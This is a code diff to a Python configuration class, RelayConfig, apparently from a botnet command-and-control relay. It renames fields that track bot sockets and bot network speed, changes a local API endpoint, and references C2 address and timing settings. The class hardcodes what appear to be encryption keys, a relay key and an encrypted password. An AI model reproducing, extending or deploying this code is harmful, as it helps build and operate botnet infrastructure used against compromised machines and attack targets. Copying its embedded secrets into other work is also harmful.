@@ -37,15 +37,15 @@ class RelayConfig:
     URL_KEY: ClassVar[str] = "VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
     RELAY_KEY: ClassVar[str] = "gAAAAABi2DQ2aBL7F1w-YK7tJQwZb_lnZY099Q2iCXqcLbLZy75ULiQk_VYWFglVco5PJrr0X-Jov_OaGwmL5HL5oYGqpACT7IiGspfgByyXQgY6U5an0Hk="
     ENC_KEY: ClassVar[str] = "kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
-    PASSWD: ClassVar[str] = "b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
-    API_URL: ClassVar[str] = "http://localhost/phybot/api/v2"
+    PASSWD: ClassVar[str] = "gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU="
+    API_URL: ClassVar[str] = "http://127.0.0.1:8052/v3"
 
     debug: bool
     fernet: Fernet
-    bots: dict[Sock, tuple[str, int]] # number of bots
-    speed: list[int] # actual netspeed of all bot
-    gen_key: list[str]
-    old_gen_key: list[str]
+    bot_speed: int # actual netspeed of all bot
+    bots_sock: dict[Sock, tuple[str, int]] # number of bots
+    swap_key: str
+    swap_key_old: str
 
     # config elements
     cnc_addr: c2_config_addr
@@ -63,10 +63,10 @@ class RelayConfig:
     def __init__(self, debug: bool = False) -> None:
         self.debug = debug
         self.fernet = Fernet(self.ENC_KEY)
-        self.bots = {}
-        self.speed = []
-        self.gen_key = []
-        self.old_gen_key = []
+        self.bots_sock = {}
+        self.bot_speed = 0
+        self.swap_key = None
+        self.swap_key_old = None
 
         self.cnc_addr = c2_config_addr()
         self.cnc_time = c2_config_time()
